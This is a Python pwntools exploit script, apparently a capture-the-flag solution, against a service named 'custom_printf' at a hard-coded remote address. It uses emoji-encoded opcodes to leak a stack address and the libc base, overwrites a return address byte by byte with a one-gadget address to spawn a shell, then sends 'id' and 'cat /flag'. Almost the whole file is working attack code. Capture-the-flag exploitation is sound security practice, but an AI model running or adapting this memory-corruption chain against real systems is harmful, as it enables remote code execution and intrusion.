from pwn import *
import ctypes


OP_OVERWRITE = '\xf0\x9f\x98\xa1'
OP_STRLEN = '\xf0\x9f\x98\x82'
OP_LEAK = '\xf0\x9f\xa4\x94'

leak_payload = 'GRI' + OP_LEAK + 'GOL' + OP_LEAK + 'JUNO' + OP_LEAK + 'IM'

def overwrite(target, byte):
    payload = ''
    payload += OP_LEAK * 7
    payload += OP_LEAK * 16
    payload += OP_LEAK * 14

    if byte < 0x60:
        payload += ' '*byte
    elif byte < 0x90:
        payload += '\xF0\x9F\x95\x9b'
        payload += '\xF0\x9F\x95\x95'
        payload += ' ' * (byte-0x60+1)
    elif byte < 0xb0:
        payload += '\xF0\x9F\x95\x9b'
        payload += '\xF0\x9F\x95\x98'
        payload += ' ' * (byte-0x90+1)
    elif byte < 0xd0:
        payload += '\xF0\x9F\x95\x9b'
        payload += '\xF0\x9F\x95\x98'
        payload += ' \xF0\x9F\x95\x9b'
        payload += '\xF0\x9F\x95\x91'
        payload += ' ' * (byte-0xb0+1)
    elif byte < 0x100:
        payload += '\xF0\x9F\x95\x9b'
        payload += '\xF0\x9F\x95\x98'
        payload += ' \xF0\x9F\x95\x9b'
        payload += '\xF0\x9F\x95\x93'
        payload += ' ' * (byte-0xd0+1)

    payload += '\xf0\x9f\x98\xa1'

    payload = payload.ljust(0xf0, '_')

    payload += p64(target)

    return payload


# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./custom_printf')#, aslr=False)
r = remote('54.64.183.252', 20008)
# r = remote('192.168.10.226', 20008)

script = '''
b *0x0000000000401A8F
# b *0x0000000000400BE2
b *0x400ffa
c
'''

r.sendline(leak_payload)

r.recvuntil('GRI')
data = int(r.recvuntil('GOL').replace('GOL', ''))

_ = ctypes.c_uint32(data + 0x1049)
w = _.value + 0x7fff00000000
print 'RET STACK', hex(w)

r.recvuntil('JUNO')
data = int(r.recvuntil('IM').replace('IM', ''))

_ = ctypes.c_uint32(data - 0x00000000000F7260)
print 'LIBC', hex(_.value)

q = _.value

libc = {}
libc[0] = q + 0x45216
libc[1] = q + 0x4526a
libc[2] = q + 0xf02a4
libc[3] = q + 0xf1147 # use this

r.sendline(overwrite(w, libc[3] & 0xff))
r.sendline(overwrite(w + 1, (libc[3] >> 8) & 0xff))
r.sendline(overwrite(w + 2, (libc[3] >> 16) & 0xff))
r.sendline('bye')

r.sendline('id')
r.sendline('cat /flag')

# r.sendline(payload)

'''
b *0x0000000000401A8F
b *0x0000000000401AE6
'''

r.interactive()